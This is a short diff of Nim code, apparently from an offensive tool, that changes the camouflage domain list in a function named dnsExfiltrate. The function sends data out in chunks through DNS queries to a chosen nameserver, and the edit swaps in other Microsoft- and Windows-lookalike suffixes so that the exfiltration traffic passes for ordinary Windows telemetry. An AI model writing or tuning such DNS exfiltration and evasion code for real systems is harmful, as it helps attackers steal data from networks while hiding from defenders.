@@ -14,7 +14,7 @@ proc dnsExfiltrate(ns: string, target: string, slp: int): void =
         header = initHeader(randId(), rd = true)
         client = initDnsClient(ns)
         chuckSize = 20 # max 62
-        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".client.a.msn.windows.com", ".wnss.a.msn.microsoft.com"]
+        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
     
     var stringindex: int
 
